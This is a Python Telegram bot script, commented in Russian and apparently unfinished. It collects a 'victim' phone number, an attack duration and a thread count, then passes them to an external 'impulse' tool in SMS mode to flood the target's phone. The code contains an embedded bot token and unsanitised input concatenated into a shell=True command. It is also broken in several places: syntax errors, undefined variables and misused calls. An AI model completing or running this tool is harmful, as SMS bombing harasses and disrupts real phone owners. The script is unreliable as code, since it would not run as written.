import telebot
import subprocess

bot = telebot.TeleBot("1884845165:AAE51LVnKOW2_tmgXyCpsC1nu-a-JXIYBuc")

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
	bot.reply_to(message, "Введите номер жертвы  \"+7..........\"")
	@bot.message_handler(content_types=['text'])
	def send_echo(message_number):
		par_number = message_number.text
		pass
	pass

bot.send_message(message.chat.id, "Введите продолдительность атаки в секундах")
@bot.message_handler(content_types=['text'])
def send_echo(message_time):
	par_time = message_time.txt
	pass


bot.send_message(message.chat.id, "Введите параметр threads (1..20)")
@bot.message_handler(content_types=['text'])
def send_echo(message_threads):
	par_threads = message_threads.txt

########################################################################################################
# Здесь необходимо запустить импульс

command = "python impulse .py --method SMS --threads " + par_threads + " --time " + par_time + " --target " + par_number
res = subprocess.call(command, shell = True)
returned_output = subprocess.check_output(res) # returned_output содержит вывод в виде строки байтов
print('Результат выполнения команды:', returned_output.decode("utf-8")) # Преобразуем байты в строку
#############################################################################################################

bot.send_message(message.chat.id, "Атака началась" + "\n" + "Чтобы остановить атаку отправьте \"Стоп\"" + "\n")
###########################################################################################################
#Здесь необходимо выводить результаты работы


###########################################################################################################

@bot.message_handler(content_types=['text'])
def send_echo(message_stop):
	stop = message_stop.txt
	if stop = "Стоп":
		#####################################################################################################
		#Здеть необходимо отправить в программу импульс сигнал об остановке
		cmd = "" # Здесь вместо date Ваша команда для git
		returned_output = subprocess.check_output(cmd) # returned_output содержит вывод в виде строки байтов
		print('Результат выполнения команды:', returned_output.decode("utf-8")) # Преобразуем байты в строку
	else:
		bot.send_message(message.chat.id, "Неизвестная команда")
	pass	


#необходимо вывести данные о ходе атаки

while res != 0:
	bot.send_message(message.chat.id, "Идет атака")
else:
	bot.send_message(message.chat.id, "Атака завершена")







bot.polling( none_stop = True) 